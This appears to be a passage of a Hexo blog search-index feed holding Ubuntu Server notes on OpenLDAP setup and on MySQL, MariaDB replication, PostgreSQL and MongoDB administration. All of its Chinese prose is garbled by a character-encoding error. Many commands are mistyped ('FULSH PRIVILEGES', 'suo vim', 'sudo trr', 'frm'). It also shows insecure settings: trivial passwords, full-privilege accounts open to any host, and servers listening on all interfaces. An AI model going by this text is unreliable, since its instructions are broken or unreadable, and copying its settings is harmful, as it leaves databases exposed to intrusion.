ä¸“é—¨é’ˆå¯¹æŸ¥è¯¢æœåŠ¡çš„æ•°æ®åº“ç»“æ„ç±»å‹ ç»Ÿä¸€æ ‡å‡†çš„æŸ¥è¯¢ç»“æ„ä»¥åŠé€šä¿¡åè®®ï¼ˆDAP -&gt;ç›®å½•è®¿é—®åè®®ï¼‰ LDAP Lightweight Directoy Access Protocol è½»é‡ç›®å½•è®¿é—®æœåŠ¡ å‘½åä¸Šé€šå¸¸ä¸DBSå‘½åä¿æŒä¸€è‡´(åœ¨ç›®å½•æœåŠ¡å†…æ‰€æœ‰å­˜å‚¨å¯¹è±¡éƒ½æœ‰å”¯ä¸€çš„è·¯å¾„åç§°) æ•°æ®åº“åŸºäºé”®å€¼å¯¹çš„æ–¹å¼å­˜å‚¨æ•°æ® X.500æ ‡å‡†çš„éƒ¨åˆ†ç‰¹æ€§é›†, å„å‚å•†ä¸åŒ åŸºäºTCP/IPåè®®é€šä¿¡(TCP 389) å¯æ„å»ºé¢å‘äº’è”ç½‘å’Œæœ¬åœ°ç½‘ç»œçš„ç›®å½•æœåŠ¡ æœ€å¸¸è§çš„LDAPæœåŠ¡ # å¾®è½¯çš„æ´»åŠ¨ç›®å½• AD ä¼ä¸šç½‘ç»œèµ„æºå…¨éƒ¨åŠ å…¥åŸŸï¼Œç»Ÿä¸€å­˜å‚¨ã€ç»Ÿä¸€å‘ˆç°ã€ç»Ÿä¸€ç®¡ç†ã€å®‰å…¨è¾¹ç•Œ # Novell eDirectory å‘½åç©ºé—´ # å…¨å±€è·¯å¾„ï¼š Distinguished Name (DN) # ç›¸å¯¹è·¯å¾„ï¼š Relative Distinguished # ç›®å½•å®¹å™¨ï¼š Directory Container (DC) æ¯ä¸€å±‚ # ç»„ç»‡å•ä½: Organisation Unit (OU) é€šå¸¸æŒ‰ç…§éƒ¨é—¨åˆ’åˆ† # æ•°æ®é¡¹ï¼š entries (object, class) ä¸€ç»„é¢„å…ˆå®šä¹‰çš„å±æ€§é›†åˆ uid, å§“ï¼Œåï¼Œå¸å·ï¼Œé‚®ç®±ï¼Œç”µè¯, ç…§ç‰‡... # åŸºç¡€æ¶æ„ï¼šSchema objectClass å®šä¹‰æ‰€æœ‰å¯¹è±¡ç±»å‹åŠå…¶å±æ€§ Schame å¯æŒ‰åº”ç”¨éœ€è¦æ‰©å±•(ç¾å›½å¯¹è±¡åœ¨ASN.1ç»“æ„ä¸­éƒ½æœ‰è‡ªå·±çš„ä½ç½® -- SNMP) # é€šç”¨åï¼š common name (CN) ä¼ ç»Ÿå‘½åç©ºé—´ æ— å›ºå®šçš„å‘½åè§„åˆ™ æŒ‰ç…§åœ°ç†ç©ºé—´å‘½å # å†™æ³• uid=babs, ou=People, dc=example, dc=com LDAPåè®®LDAPæœ€åˆä½œä¸ºTCP/IPå®¢æˆ·udanä¸X.500ç›®å½•æœåŠ¡ç½‘å…³ä¹‹é—´å‘é€šä¿¡åè®®LDAPv3: å¼ºèº«ä»½è®¤è¯å’Œæ•°æ®åŠ å¯† åŸºäºè¯ä¹¦çš„SSLåŠ å¯† ä½¿ç”¨Unicodeç¼–ç å®ç°å›½é™…åŒ– Schemaå¯æ‰©å±• å®‰è£…å¹¶é…ç½®LDAP æ‹¿å‡ºä¸€å°æœåŠ¡å™¨ä½œä¸ºä¸“é—¨çš„LDAPçš„æœåŠ¡å™¨ï¼Œä»¥åçš„èº«ä»½è®¤è¯éƒ½ä½¿ç”¨é›†ä¸­çš„LDAPçš„(ä¸å±€é™ä¸æ“ä½œç³»ç»Ÿï¼ŒWebåº”ç”¨ä¹Ÿå¯ä»¥ï¼Œåªè¦ç¨‹åºæ”¯æŒldapå°±å¯ä»¥ä½¿ç”¨è¿™ä¸ªåšèº«ä»½è®¤è¯) å…ˆä¿®æ”¹ä¸»æœºåï¼š sudo sed -i 's/preserve_hostname:false /preserve_hostname:true /g' /etc/cloud/cloud.cfg echo "192.168.0.104 ldap.lab.com" | sudo tee -a /etc/hosts # ipåœ°å€ä¸åç§°çš„è§£æå…³ç³» # ä¿®æ”¹ä¸»æœºå sudo hostnamectl set-hostname ldap.lab.com reboot å®‰è£… OpenLDAP # Ubuntu Linuxä¸­é»˜è®¤çš„LDAPå®ç° sudo apt install slapd ldap-utils # slapd æ˜¯æœåŠ¡ç«¯å’Œåå°è¿›ç¨‹(å³LDAP server) # ldap-utils ï¼ˆldapå·¥å…·ï¼‰ ldapadd # æ·»åŠ æ•°æ® ldapdelete # åˆ é™¤æ•°æ® ldapmodify # ä¿®æ”¹ ldapsearch # æŸ¥è¯¢ï¼ˆæœ€å¸¸ä½¿ç”¨ï¼‰ ldappasswd # ä¿®æ”¹å¯†ç  ... ... ä¿®æ”¹é…ç½®æ–‡ä»¶ # sudo vim /etc/ldap/ldap.conf BASE dc=lab,dc=com # ç›®å‰å’Œdnsçš„åŸŸåä¿æŒä¸€ç›´å³å¯ URI ldap://ldap.lab.com:389 # å¯ä»¥é€šè¿‡è¿™ä¸ªåœ°å€å¯¹..è¿›è¡ŒæŸ¥è¯¢ åˆå§‹åŒ–é…ç½® # ä¸€æ¬¡å°±å¤Ÿäº†!!! sudo dpkg-reconfigure slapd # è¿˜å¯ä»¥è®¾ç½®ä¸€æ¬¡å¯†ç  # æ•°æ®åº“å»ºè®®é€‰æ‹©MDB éªŒè¯ # å¤šç§éªŒè¯æ–¹å¼ sudo slapcat sudo tree /etc/ldap/slapd.d/ # æœ‰å†…å®¹å°±å¯ # é»˜è®¤ç®¡ç†å‘˜å¸å· admin ldapsearch -x -LLL -b dc=lab,dc=com ldapsearch -x -LLL -b dc=lab,dc=com dn # åé¢çš„å†…å®¹æ˜¯ç­›é€‰ # -x ç®€å•èº«ä»½éªŒè¯ # -LLL ä»¥æ ‡å‡†LDIFæ–‡ä»¶æ ¼å¼æ˜¾ç¤ºç»“æœ # -b åŸºåœ°å€ å‘ç›®å½•ä¸­æ·»åŠ è®°å½•ä¿å­˜ä¿¡æ¯ # ä¿å­˜ä¿¡æ¯åˆ°æ–‡ä»¶ # vim add.ldif # ou: ç‰©ç†çš„å±‚çº§ç»“æ„åˆ’åˆ† dn: ou=People,dc=lab,dc=com objectClass: organizationalUnit ou: People # ç‰©ç†çš„ dn: ou=Group,dc=lab,dc=com # ouçš„åç§°å«Group, ä¸€ä¸ªå¯¹è±¡åªèƒ½åœ¨ä¸€ä¸ªouä¸­, ouæ˜¯ç‰©ç†ä¸Šçš„ objectClass: organizationalUnit ou: Group # é€»è¾‘çš„ # ç»„å¸å·s dn: cn=delevopment,ou=Group,dc=lab,dc=com # åˆ›å»ºä¸€ä¸ªç»„ï¼Œcnåˆ«å objectClass: organizationalUnit cn: delevopment gidNumber: 3000 # ç”¨æˆ·å¸å· dn: uid=zhangsan,ou=People,dc=lab,dc=com # åˆ›å»ºä¸€ä¸ªç»„ï¼Œcnåˆ«å objectClass: inetOrgPerson # ç»§æ‰¿æŸäº›å¯¹è±¡ç±»å‹ objectClass: posixAccount objectClass: shadowAccount uid: zhangsan sn: zhang givenName: san cn: san zhang # åˆ«å displayName: San Zhang uidNumber: 2000 gidNumber: 3000 # è®©ç”¨æˆ·åŠ å…¥æŸä¸ªç»„ userPassword: 123465 loginShell: /bin/bash homeDirectory: /home/zhangsan/ å¯¼å…¥ï¼š ldapadd -x -D cn=admin,dc=lab,dc=com -W -f add.ldif # -x ç®€å•èº«ä»½éªŒè¯ # -D æŒ‡å®šç®¡ç†å‘˜å¸å·(å®Œæ•´çš„åˆ«åï¼š cn=admin,dc=lab,dc=com) # -W æç¤ºè¾“å…¥å¯†ç  # -f æŒ‡å®šldifæ–‡ä»¶ éªŒè¯ ldapsearch -x -LLL -b dc=lab,dc=com 'uid=zhangsan' cn sn gidNumber uidNumber givenName # æŸ¥çœ‹å±æ€§ç±»å‹å’Œå€¼ å‚è€ƒç½‘å€ https://ldapwiki.com/wiki/ObkectClass#Types ä¿®æ”¹æ•°æ®è·Ÿä¸Šé¢æ˜¯ç±»ä¼¼çš„ Webç®¡ç†æ‰‹åŠ¨å†™é…ç½®å¤ªéº»çƒ¦ï¼Œå›¾å½¢åŒ–çš„ç®€åŒ–äº†æ“ä½œWebåº”ç”¨ç¨‹åº(æœ‰å¾ˆå¤šç§)ï¼š ldap-account-manager (lam) sudo apt install apache2 sudo apt install php php-cgi libapache2-mod-php php-common php-pear php-mbstring sudo a2enconf php7.2-cgi # æ¿€æ´»è¿™ä¸ªæ¨¡å— sudo systemctl reload apache2 sudo systemctl restart apache2 sudo apt install ldap-account-manager # ldap-account-managerä½¿ç”¨çš„æ•°æ®åº“ä½¿ç”¨çš„æ˜¯ç›®å½•æœåŠ¡çš„æ•°æ®åº“ï¼Œä½†æ˜¯ä»–çš„æ•°æ®ä¹Ÿæ²¡æœ‰å†™åˆ°æ•°æ®åº“ä¸­ï¼Œè€Œæ˜¯å­˜åœ¨äº†é…ç½®æ–‡ä»¶ä¸­ # è®¿é—®å³å¯ # http:/192.168.0.104/lam # ç‚¹å‡»å³ä¸Šè§’ LAM configuration é…ç½® edit server... , è¿›è¡Œç®€å•é…ç½® # å…¶ä»–é…ç½®æ ¹æ®è‡ªå·±éœ€æ±‚æ¥æ”¹ è®¾ç½®å®‰å…¨è®¿é—® sudo vim /etc/apache2/conf-enabled/ldap-account-manager.conf #Require all granted æ³¨é‡Šæ‰æ‰€æœ‰ipå¯è®¿é—® Require ip 127.0.0.1 192.168.0.0/24 # é‡å¯æœåŠ¡ å…¶ä»–ldapåŸºäºwebçš„ç®¡ç†å·¥å…· # phpLDAPAdmin sudo apt install phpldapadmin # åˆ›å»ºç»„å¸å· # åˆ›å»ºå¸å· # ... å®¢æˆ·ç«¯Windowså®¢æˆ·ç«¯winè‡ªå¸¦çš„GINAæä¾›Windowsç³»ç»Ÿç™»å½•ç•Œé¢ï¼Œ æ”¯æŒæœ¬æœºã€åŸŸè´¦æˆ·ç™»é™† pGinaå¼€æºèº«ä»½è®¤è¯æä¾›è€… - é›†æˆå¹¶æ›¿æ¢windowç³»ç»Ÿé»˜è®¤çš„GINA - é€šè¿‡æ’ä»¶æ”¯æŒå¤§é‡èº«ä»½éªŒè¯æ•°æ®å­˜å‚¨(LDAP, MySQL, RADIUS) - `http://pgina.org` ä¸‹è½½å®‰è£…ç¨³å®šç‰ˆ è¿›è¡Œä¸€äº›é…ç½® Linuxå®¢æˆ·ç«¯åŸŸåè§£æ echo "192.168.0.104 ldap.lab.com" |sudo trr -a /etc/hostss å®‰è£…å®¢æˆ·ç«¯ sudo apt install libnss-ldap libpam-ldap ldap-utils nscd # æŒ‡å®šä¸€äº›å‚æ•° ldap://ldap.lab.com dc=lab,dc=com cn=admin,dc=lab,dc=com ä¿®æ”¹é…ç½®æ–‡ä»¶ # sudo vim /etc/nsswitch.conf passswd: compat systemd ldap group: compat systemd ldap shadow: compat ldap # sudo vim /etc/pam.d/common-password åˆ é™¤ use_authtok è¿™ä¸€å°å— # sudo vim /etc/pam.d/common-session session optional pam_mkhomedir.so skel=/etc/skel umask=077 # å…è®¸åˆ›å»ºç”¨æˆ·ä¸»ç›®å½• sudo systemctl restart nscd.service # éªŒè¯ getent passwd zhangsan reboot # ç™»å½•çš„æ—¶å€™ï¼Œç‚¹å‡» not list æ‰èƒ½è¿›å…¥åˆšæ‰çš„å¸å· document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
        <tag>LDAP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server- ubuntu-server-æ•°æ®åº“ç®¡ç†æœåŠ¡]]></title>
    <url>%2Fposts%2F677%2F</url>
    <content type="text"><![CDATA[ubuntu-server-æ•°æ®åº“ç®¡ç†æœåŠ¡ æ•°æ®å°±æ˜¯ç”Ÿäº§åŠ› æ•°æ®å°±æ˜¯åº”ç”¨çš„æ ¸å¿ƒæŒ‰ç…§ç»“æ„ç»„ç»‡ï¼Œå­˜å‚¨å’Œç®¡ç†æ•°æ®çš„ä»“åº“Oracle, DB2, MySQL, MSSQL, PostgreSQL, Infomix, MongoDB æ•°æ®åº“ç®¡ç†ç³»ç»Ÿ(DBMS) MySQLæ•°æ®åº“ç®¡ç† å®‰è£… sudo apt install mysql-server å®‰å…¨é…ç½® sudo mysql_secure_installation # å»ºè®®ç¦æ­¢rootè¿œç¨‹ç™»å½• # è¿™é‡Œè®¾ç½®çš„rootçš„å¯†ç ä¸æ˜¯ï¼Œåé¢æ‰è®¾ç½®, å› ä¸ºåˆå§‹èº«ä»½è®¤è¯æ–¹å¼æ˜¯auth_socket Rootå¸å·å¯†ç ç™»å½• sudo mysql # åˆå§‹èº«ä»½è®¤è¯æ–¹å¼æ˜¯auth_socketï¼Œæ‰€ä»¥æš‚æ—¶ä¸éœ€è¦è¾“å…¥å¯†ç  SELECT user,host,authentication_string, plugin,host FROM mysql.user; # ç»™rootè®¾ç½®å¯†ç è®¤è¯æ–¹å¼mysql_native_password ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY '12345678'; FULSH PRIVILEGES; # ç™»å½• mysql -u root -p åˆ›å»ºæ•°æ®åº“ä¸ªäººå¸å·(å»ºè®®ä¸è¦ä½¿ç”¨rootè¿›è¡Œè¿è¡Œ,è€Œåº”è¯¥ä½¿ç”¨ä¸ªäººå¸å·, ä¸”å¯†ç ä¸èƒ½ç›¸åŒ) create user 'xps'@'%' identified by '12345678'; # èµ‹äºˆæƒé™(4çº§) # *.* æ˜¯å“ªä¸ªåº“å“ªä¸ªè¡¨ï¼Œè¿™é‡Œè¡¨ç¤ºæ‰€æœ‰åº“æ‰€æœ‰è¡¨ grant all privileges on *.* to 'xps'@'%' with grant option; ä¿®æ”¹å¯†ç  set password for 'xps'@'%'=password('12345678'); ç½‘ç»œè®¿é—®å¸å·(å¯ä»¥è¿œç¨‹è®¿é—®) # ä¸€èˆ¬è¿™ç§æƒ…å†µï¼Œéƒ½é™åˆ¶è¦æ“ä½œçš„åº“å’Œæ“ä½œ # % use mysql # ç›´æ¥grantèµ‹äºˆæƒé™ï¼Œå°±å¯ä»¥åˆ›å»ºä¸å­˜åœ¨çš„ç”¨æˆ· grant all privileges on *.* to admin@'%' identified by '12345678' with grant option; # ç§»é™¤æƒé™ revoke all on db_name from user_name; # æŸ¥çœ‹å¯†ç ç­–ç•¥(ä¸€æ—¦å…è®¸ç½‘ç»œè¿æ¥ï¼Œå¯†ç çº§åˆ«å°±ä¼šå˜æˆä¸­å®‰å…¨çº§åˆ«äº†) select @@validate_password_policy; ç¼–è¾‘é…ç½®æ–‡ä»¶ # sudo vim /etc/mysql/mysql.conf.d/mysqld.cnf # ä¿®æ”¹ä¾¦å¬ç½‘å¡ä¸ºè‡ªå·±ç½‘å¡çš„ipåœ°å€ bind-address = 192.168.0.112 # é‡å¯ç½‘å¡ # ä½¿ç”¨mysqlå®¢æˆ·ç«¯è¿æ¥ï¼Œ æˆ–Falconç­‰å›¾å½¢åŒ–å®¢æˆ·ç«¯ mysql -h 19.168.0.112 -u root SQLè¯­å¥å¢åˆ æ”¹æŸ¥æœ€åŸºæœ¬ -- å½“å‰å¸å· select user(); -- æŸ¥çœ‹å·²ç»æœ‰çš„åº“ select databases; -- é€‰å–(åˆ‡æ¢)åº“ use test; select database(); -- æ˜¾ç¤ºè¡¨(å·²é€‰æ‹©åº“) show tables; -- ç®€å•åˆ›å»ºåº“ create database test; åˆ›å»ºè¡¨ create table users( id INT NOT NULL PRIMARY KEY AUTO_INCREMENT, name CHAR(25) NOT NULL, pass CHAR(25) NOT NULL, age INT(9) NOT NULL ) charçš„æ€§èƒ½è¦ä¼˜äºvarchar æ’å…¥è®°å½• insert into users values(1,'xps','1234567890',20); insert into users(id,name,pass,age) values(null,'xps','1234567890',20); # æŒ‡å®šåˆ— æŸ¥çœ‹è¡¨ç»“æ„ desc users; show create table users; # Engine=InnoDB å­˜å‚¨å¼•æ“ show full columns from users; æŸ¥è¯¢ select * frm users where age &lt;20 and age >16; select name,pass from users order by age; select name,pass from users order by age desc; # é™åº select concat(name,0x7e,pass,0x7e) as user_pass from users; # concat ç»“åˆï¼Œ è¡¨å¤´å˜æˆuser_pass select group_concat(name, pass) from users; ä¿®æ”¹è®°å½• update users set name='xpsss' where id=1; åˆ é™¤è®°å½• delete from users where id=1; åˆ é™¤è¡¨ drop table tests; drop table if exists tests; åˆ é™¤åº“ drop database test; æŸ¥çœ‹æ•°æ®å¼•æ“ show engines; # ä¿®æ”¹å­˜å‚¨å¼•æ“ï¼ˆè¿™é‡ŒæŒ‡å®šè¡¨ï¼‰ alter table student engine=MYISAM; ä¿®æ”¹è¡¨å alter table student RENAME student2; ä¿®æ”¹å­—æ®µæ•°æ®ç±»å‹ alter table student MODIFY name varchar(30); ä¿®æ”¹å­—æ®µå alter table student CHANGE name uname varchar(40); å¢åŠ å­—æ®µ alter table student ADD techer_name vchar(20) NOT NULL after id; # ä½ç½®æ”¾åœ¨idå­—æ®µçš„åé¢ åˆ é™¤å­—æ®µ alter table student FROP teacher_name; å¤‡ä»½å¤‡ä»½å¯¼å‡ºå¤‡ä»½åº“ï¼Œè¡¨ mysqldump -u root -p tes_db >db_back.sql mysqldump -u root -p test_db users >db_back.sql mysqldump --all-databases -u root -p >all_db_back.sql å¤‡ä»½æŒ‡å®šæ•°æ® # å…ˆè¿›å…¥sqlå‘½ä»¤ç»ˆç«¯ï¼Œè¿›è¡Œå¯¼å‡º select * from users; > q.sql ## æˆ–è€… # 1. å…ˆæŠŠsqlè¯­å¥ä¿å­˜ä¸ºæ–‡ä»¶ï¼Œ echo 'select * from users;' > q.sql # 2.ç„¶åæ‰§è¡Œæ¥è¿›è¡Œå¯¼å‡º mysql -u root -p test &lt; q.sql >out.csv å¯¼å‡ºCSV show variables like '%secure%'; # å…ˆæ‰¾åˆ°å¤‡ä»½è·¯å¾„ï¼Œæ‰¾åˆ°secure_file_privè·¯å¾„å°±æ˜¯é»˜è®¤å¯¼å‡ºçš„è·¯å¾„ # ä¿å­˜ï¼Œ å¹¶æ‰§è¡Œåˆ†éš”æˆ–æ¢è¡Œ select * from users into outfile '/var/lib/mysql-files/aaa.csv' fields terminated by ',' enclosed by lines '"' terminated by '\n'; å¯¼å…¥å¯¼å…¥ # åˆ›å»ºåº“çš„å‘½ä»¤ mysqladmin -u root -p create db2 # ä¹Ÿå¯ä»¥åœ¨sqlç»ˆç«¯ create database xxx; # å¯¼å…¥ mysql -u root -p db2 &lt; db_bak.sql å¯¼å…¥CSV LOAD DATA INFILE '/var/lib/mysql-files/aaa.csv' INTO TABLE users FIELDS TERMINARED BY ',' ENCLOSED BY '"' LINES TERMINARED BY \n IGNORE 1 ROWS; MariDBå®‰è£…é…ç½®å®‰è£… sudo apt install mariadb-server å®‰å…¨è®¤è¯ sudo mysql_secure_installation æ”¹ä¸ºå¯†ç è®¤è¯ sudo mysql use mysql; select user.host,plugin,password from mysql.user; # æŸ¥çœ‹ update user set plugin='' where user ='root' # mysql_native_passwordæˆ–ç©ºå°±è¡Œ fulsh privileges; é…ç½®æ–‡ä»¶ # /etc/mysql/mariadb.conf.d/50-server.cnf bind-address = 0.0.0.0 # æ¯ä¸€ä¸ªç½‘å¡éƒ½ä¼šä¾¦å¬3306 ä¸»å¤‡æœåŠ¡å™¨(æ•°æ®åº“å¤åˆ¶)å¤åˆ¶ ReplicationMaster -&gt; Slave è¯»/å†™é™å®šæ‰€æœ‰åº“ï¼ŒæŒ‡å®šåº“ï¼Œè¡¨ è¿›è¡Œå¤åˆ¶ å¤åˆ¶åŸç†bin-log äºŒè¿›åˆ¶æ—¥å¿—æ‰€æœ‰DBäº‹ä»¶å…ˆå†™å…¥bin-logSlaveä»Masterè¯»å–bin-log ç”¨é€” æ‰©å±•ï¼šSlaveåˆ†æ‹…masterè´Ÿè½½ åˆ†æï¼šæ•°æ®åˆ†æä¸å½±å“Master å¤‡ä»½ï¼šä½œä¸ºä¸€ç§æ•°æ®å¤‡ä»½æ‰‹æ®µ åˆ†å¸ƒï¼šå¼‚åœ°ä¿å­˜æ•°æ®å‰¯æœ¬ï¼ˆä¹Ÿå¯ä»¥å®ç°åº”ç”¨è®¿é—®æœ¬åœ°åº“ï¼‰ æ¼”ç¤º1.å®‰è£…ä¸¤å°ç‹¬ç«‹çš„MariaDBæœåŠ¡å™¨ å¤åˆ¶ä¹‹å‰ç”¨å¯¼å…¥å¯¼å‡ºæ•°æ®åº“çš„æ–¹å¼ä¿æŒMaster/Slaveæ•°æ®ä¸€è‡´ å¤åˆ¶å‰é”å®šåº“(ç¦æ­¢å†™å…¥) # ç”Ÿäº§ç¯å¢ƒ flush tables with read lock; 2.é…ç½® Master # suo vim /etc/mysql/conf.d/mysql.cnf #å¢åŠ å¦‚ä¸‹é…ç½® [mysqld] log-bin # å¼€å¯bin-logåŠŸèƒ½ binlog-do-db=test # binlog-ignore-db="mysql" # é™¤äº†å¿½ç•¥çš„åº“ï¼Œå…¶ä»–çš„å…¨å¤åˆ¶ server-id=1 3.é…ç½®masterçš„mariadbè¿œç¨‹è®¿é—®bind-address 0.0.0.0 4.é‡å¯æœåŠ¡ sudo systemctl restart mariadb 5.é…ç½®masteråˆ›å»ºç”¨æˆ·å¸å· #192.168.0.111 æ˜¯slaveçš„åœ°å€ï¼Œ *.*å…è®¸å¤åˆ¶æ‰€æœ‰æ•°æ®åº“, replicateç”¨æˆ·å grant replicate *.* to 'replicate'@'192.168.0.111' with identified by 'passwd'; 6.é…ç½®Slave ## 1. # suo vim /etc/mysql/conf.d/mysql.cnf #å¢åŠ å¦‚ä¸‹é…ç½® [mysqld] server-id=1 ## 2.å¼€å¯è¿œç¨‹è®¿é—®bind-address 0.0.0.0 ## 3. é‡å¯æ•°æ®åº“æœåŠ¡ 7.ç™»å½•sqlç»ˆç«¯ # master_useræ˜¯masteræœåŠ¡å™¨ä¸Šåˆ›å»ºçš„mysqlçš„ç”¨æˆ· change master to master_host="192.168.0.112",master_user="replicate",master_password='password'; 8.æ‰“å¼€masteré”unlock tables; 9.æŸ¥çœ‹slaveçŠ¶æ€ -- slaveçš„sqlç»ˆç«¯ show slaves status\G start slave; # å¦‚æœæ²¡å¯åŠ¨ï¼Œå¯ä»¥æ‰‹åŠ¨å¯åŠ¨ æµ‹è¯•æ•ˆæœ # åœ¨masteræ‰§è¡Œ cd test; insert into users values(1,'yyy','pass'); delete from users where id=1; # åœ¨slaveä¸ŠæŸ¥è¯¢ï¼Œå‘ç°æ•°æ®å·²ç»åŒæ­¥è¿‡æ¥äº†ï¼Œè¿‘ä¹å®æ—¶ Mysqltuner â€“ é…ç½®è°ƒä¼˜å·¥å…·åŒ…å®‰è£… sudo apt install mysql è¿è¡Œsudo Mysqltunerä¼šç”Ÿæˆä¸€å †ä¿¡æ¯é…ç½®è°ƒä¼˜å»ºè®®(ç»¿è‰²çš„è¡¨ç¤ºæ²¡é—®é¢˜ï¼Œå…¶ä»–é¢œè‰²çš„å¯ä»¥æ ¹æ®å¸®åŠ©æ¥ä¼˜åŒ–) Postgresql ä¸‹ä¸€ä»£å…³ç³»æ•°æ®åº“ é…ç½®å’Œä¿®æ”¹ é«˜å¹¶å‘æƒ…å†µä¸‹æ€§èƒ½ä¼˜äºMySQL ä¾¦å¬ç«¯å£ TCP 5432 å®‰è£… sudo apt install postgresql èº«ä»½è®¤è¯ é»˜è®¤ä½¿ç”¨IDENTèº«ä»½è®¤è¯æ–¹å¼ ä½¿ç”¨ä¸æ“ä½œç³»ç»ŸåŒåçš„æ•°æ®åº“å¸å·(postgresç›¸å½“ä¸MySQLä¸­çš„root) è¿›å…¥ sudo -u postgres psql # ç›´æ¥ç™»å½•åˆ°åº“çš„åç§°(template1æ˜¯é»˜è®¤ç”Ÿæˆçš„) sudo -u postgres psql template1 ä¿®æ”¹å¯†ç  # sqlç»ˆç«¯ # ä½¿ç”¨åŠ å¯†çš„æ–¹å¼ alert user postgres with encrypted password 'your_passwd'; \q # é€€å‡º # bashç»ˆç«¯ # ä¿®æ”¹é…ç½®æ–‡ä»¶ vim /etc/postgresql/10/main/pg_hba.conf local all postgres md5 # æœ¬åœ°ç™»å½• æ‰€æœ‰æ•°æ®åº“ èº«ä»½ å¯†ç md5åŠ å¯† # é‡å¯æœåŠ¡ # ç™»å½• -Wè¾“å…¥å¯†ç  psql -U postgres -W -d db_name é…ç½®æ–‡ä»¶ /etc/postgresql/&lt;version>/main # é…ç½®æ–‡ä»¶ç›®å½• /etc/postgresql/10/main/pg_ident.conf # IDENTèº«ä»½è®¤è¯é…ç½® /etc/postgresql/10/main/postgresql.conf # ç½‘ç»œèº«ä»½è®¤è¯é…ç½® # listen_address='*' # IPV6 '::' ç½‘ç»œè¿æ¥ # å®¢æˆ·ç«¯ sudo apt install postgresql-client # è®¾ç½®å…è®¸å“ªäº›ä¸»æœºè¿æ¥æˆ‘ä»¬(å¿…é¡»æŒ‡å®šæ©ç ) vim /etc/postgresql/10/main/pg_hba.conf local all postgres 192.168.0.111/32 md5 #é‡å¯æœåŠ¡ # å®¢æˆ·ç«¯è¿æ¥ psql -h 192.168.0.112 -U postgres -W -d db_name åˆ›å»ºå¸å· # postgresæƒé™å¤ªå¤§ï¼Œä¸å»ºè®®å¹³æ—¶ä½¿ç”¨ # F1 æœåŠ¡å™¨ç«¯ç»ˆç«¯ sudo -u postgres createuser xps # gropuser xps # F2 sqlå‘½ä»¤è¡Œ create user foobar; # drop user xps æ–‡æ¡£æ‰‹å†Œ sudo apt install postgresql-doc-10 /usr/share/postgresq-doc-10/html/index.html å®˜æ–¹æ–‡æ¡£: https://www.postgresql.org/docs/current/static/tutorial.html åŸºæœ¬æŒ‡ä»¤åˆ›å»ºåº“ # sudo -u postgres createdb mydb; # æˆ– create database mydb; åˆ é™¤åº“ sudo -u postgres dropedb mydb; # æˆ– drop database mydb; åˆ›å»ºè¡¨ create database users ( uname varchar(25); pwd carchar(25); date date ); `` æ’å…¥æ•°æ® â€‹```bash insert into users values('xps','1234567890','1997-07-07'); # æ‰¹é‡æ’å…¥æ•°æ®(æ•°æ®æå‰ä¿å­˜) copy users from '/home/user/users.txt' å¿«æ·å‘½ä»¤ \c db_name # åˆ‡æ¢æ•°æ®åº“ ï¼ˆuse mydb;ï¼‰ \c - username # åˆ‡æ¢ç”¨æˆ· \l # åˆ—å‡ºæ•°æ®åº“(show databases;) \dt # åˆ—å‡ºè¡¨(show tables;) \d table_name # æŸ¥çœ‹è¡¨ç»“æ„ NoSQLæ¦‚è§ˆä¸MongoDB å¸¸è§çš„NoSQLæ•°æ®åº“ç±»å‹1.é”®å€¼å¯¹ç±»å‹ Paperæ¨èå¤šçœ‹çœ‹ MongoDBå®‰è£… sudo apt-get install -y mongodb å®¢æˆ·ç«¯ # æœ¬åœ°ç™»å½• mongo # è¿œç¨‹ç™»å½• mongo 192.168.0.112:27017/db_name # å¸¸ç”¨ç®¡ç†å‘½ä»¤ help è¿›å…¥åº“ use mydb; # å¦‚æœä¸å­˜å…¥æ•°æ®ï¼Œä»–è¿˜æ˜¯å°±æ²¡äº† è¾“å…¥æ•°æ® # åˆ›å»ºæ–‡æ¡£é›† db.createCollection('users') # æ’å…¥æ•°æ® db.users.insert({'name':'uuu','uid':123}) æŸ¥è¯¢åº“ show dbs show collections å¤šèµ‹å€¼ db.users.insert({'name':'uuu','uid':123,gid:[111,222,333]}) æŸ¥è¯¢ db.users.find(); db.users.findOne({'uid':1001}) db.users.findOne({'uid':{$gtï¼š1000}}) # å¤§äº db.users.find({'uid':{$gtï¼š1000}}) # å¤§äº db.users.find({$or: [{name:'ubuntu'}, {name;'centos'}]}) # or db.users.findOne({'uid':1001}, {name:0}) # name:0 ä¸æ˜¾ç¤ºnameå­—æ®µ ä¿®æ”¹è®°å½• db.users.update({'uid':1001}, {$set:{name:'hhh'}}) åˆ é™¤è®°å½• db.users.remove({'uid':1001}, ) åˆ é™¤collection db.users.drop() åˆ åº“ db.dropDatabase() è¯¦ç»†ç”¨æ³•å‚è€ƒå®˜æ–¹æ–‡æ¡£â€¦â€¦ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
        <tag>ubuntu-server-æ•°æ®åº“ç®¡ç†æœåŠ¡</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-LAMP]]></title>
    <url>%2Fposts%2F45152%2F</url>
